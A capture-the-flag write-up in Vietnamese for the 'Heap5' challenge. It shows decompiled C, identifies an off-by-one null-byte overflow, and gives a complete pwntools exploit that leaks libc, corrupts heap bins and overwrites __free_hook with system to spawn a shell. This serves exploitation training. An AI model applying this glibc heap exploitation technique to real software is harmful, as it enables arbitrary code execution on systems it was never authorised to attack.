# Heap5

## Mitigation

```text
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  initState(argc, argv, envp);
  puts("Ez heap challange !");
  while ( 1 )
  {
    menu();
    switch ( (unsigned int)readInt() )
    {
      case 1u:
        createHeap();
        break;
      case 2u:
        showHeap();
        break;
      case 3u:
        editHeap();
        break;
      case 4u:
        deleteHeap();
        break;
      case 5u:
        exit(0);
      default:
        puts("no option");
        break;
    }
  }
}
```

```c
__int64 createHeap()
{
  unsigned int Int; // [rsp+8h] [rbp-8h]
  unsigned int nmemb; // [rsp+Ch] [rbp-4h]

  printf("Index:");
  Int = readInt();
  if ( Int >= 0xA )
    exit(0);
  if ( store[Int] )
    return 0LL;
  printf("Input size:");
  nmemb = readInt();
  if ( nmemb > 0x1000 )
    exit(0);
  store[Int] = calloc(nmemb, 1uLL);
  storeSize[Int] = nmemb;
  printf("Input data:");
  readSTr(store[Int], nmemb);
  puts("Done");
  return 0LL;
}
```

```c
__int64 editHeap()
{
  unsigned int Int; // [rsp+4h] [rbp-1Ch]
  char size[10]; // [rsp+8h] [rbp-18h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Input index:");
  Int = readInt();
  if ( Int >= 0xA )
    exit(0);
  if ( !store[Int] )
    return 0LL;
  printf("Input newsize:");
  *(_DWORD *)size = readInt();
  if ( *(_DWORD *)size > storeSize[Int] )
  {
    free((void *)store[Int]);
    store[Int] = malloc(*(unsigned int *)size);
    storeSize[Int] = *(_DWORD *)size;
  }
  puts("Do you want to change data (y/n)?");
  readStr(&size[6], 10LL);
  if ( !strcmp(&size[6], "y") )
  {
    printf("Input data:");
    readSTr(store[Int], (unsigned int)storeSize[Int]);
  }
  puts("Done ");
  return 0LL;
}
```

```c
__int64 __fastcall readSTr(void *a1, unsigned int a2)
{
  int v3; // [rsp+1Ch] [rbp-4h]

  v3 = read(0, a1, a2);
  if ( v3 < 0 )
    exit(0);
  *((_BYTE *)a1 + v3) = 0;
  return (unsigned int)v3;
}
```

## Vulnerability

Ta thấy trong hàm `createHeap` và `editHeap` đều sử dụng hàm `readSTr` để đọc dữ liệu vào heap. Hàm `readSTr` sẽ đọc dữ liệu vào heap nhưng nếu dữ liệu nhập vào có size bằng với `a2` khi đó `*((_BYTE *)a1 + v3) = 0;` sẽ gây ra tràn một null byte sang vùng nhớ phía sau. 
=>> Sử dụng `poision null byte` để leak libc và overwrite `__free_hook` thành `system` để thực thi được lệnh `sh`

## Exploit

```python
p = start()
libc = ELF('./libc.2.23.so')

def create(idx,size,data):
    p.send(b'1')
    p.sendafter(b'Index:',str(idx).encode())
    p.sendafter(b'size:',str(size).encode())
    p.sendafter(b'Input data:',data)

def show(idx, data_before):
    p.send(b'2')
    p.sendafter(b'Index:',str(idx).encode())
    p.recvuntil(b'Data = ' + data_before)
    return p.recvline()

def edit(idx,newsize,data):
    p.send(b'3')
    p.sendafter(b'index:',str(idx).encode())
    p.sendafter(b'newsize:',str(newsize).encode())
    p.sendafter(b'(y/n)?\n',b'y')
    p.sendafter(b'Input data:',data)

def delete(idx):
    p.send(b'4')
    p.sendafter(b'index:',str(idx).encode())

create(0,0x200 - 0x10,b'a'*(0x200-0x10))      # chunk_aaaa, idx = 0    with size = 0x1F0
create(1,0x68,b'bbbb')                        # chunk_bbbb, idx = 1
create(4,0x68,b'e'*16)                        # chunk_eeee, idx = 4
create(2,0x200 - 0x10,b'cccc')                # chunk_cccc, idx = 2
create(3,0x68,b'dddd')                        # chunk_dddd, idx = 3

# chunk_aaaa will be a valid free chunk (containing libc-addresses in FD/BK)
delete(0)

# overwrite prev_inuse bit of following chunk (chunk_cccc), and set prev_size of following chunk to 0x2E0
edit(4,0x68,b'a'*(0x60) + p64(0x270 + 0x70))

# now delete chunk_CCC to trigger consolidation with the fakechunk (0x2E0)
# after this we have got a big free chunk (0x4E0) overlapping with chunk_bbbb, chunk_eeee
delete(2)

# create a new chunk (chunk_ffff) within the big free chunk to push
# the libc-addresses (fd/bk) down to chunk_BBB
create(0,0x200 - 0x10,b'ffff')

# the content of chunk_BBB now contains fd/bk (libc-addresses)
libc.address = u64(show(1,b'').strip().ljust(8,b'\x00')) -  0x39bb78
log.info('libc.address = ' + hex(libc.address))

# normally, we can use one_gadget with malloc_hook, but it's not working here. So we use __free_hook
# to use free_hook, we need to write to the address that before free_hook. So we can bypass the size check of fastbin

# set correct prev_size of chunk_eeee
# because i malloc 0x1f0 before, but now i malloc 0x200. So 16byte in the end of chunk_aaaa will be prev_size, and size of chunk_bbbb
delete(0)
create(0,0x200,b'a' * 0x1f8 + p64(0x70))

# now chunk_bbbb will be a valid free chunk
delete(1)

# just delete and malloc chunk_aaaa again to edit chunk_bbbb after free chunk_bbbb
delete(0)

# fastbin 0x70 list: chunk_bbbb -> __free_hook - 0x19
create(0,0x270,(b'a' * 0x1f8 + p64(0x70) + p64(libc.sym['__free_hook'] - 0x19)).ljust(0x270 - 8,b'\x00') + p64(0x70)) # (*)
create(5,0x68,b'/bin/sh\x00')

# when we create chunk at (*), it will unlink, and the chunk remain in unsorted bin list is after address of chunk_eeee
# so we can edit chunk_eeee to overwrite BK pointer
edit(4,0x68,p64(0) + p64(0x261) + p64(0) + p64(libc.sym['__free_hook'] - 0x10 - 0x16))

# now we can overwrite __free_hook to system
create(7,0x258,b'aaaa')

# malloc new fastbin chunk to overwrite __free_hook
create(6,0x68,b"X"*9 + p64(libc.sym['system']))

# trigger free to call system
p.send(b'4')
p.sendafter(b'index:',str(5).encode())

p.interactive()
```
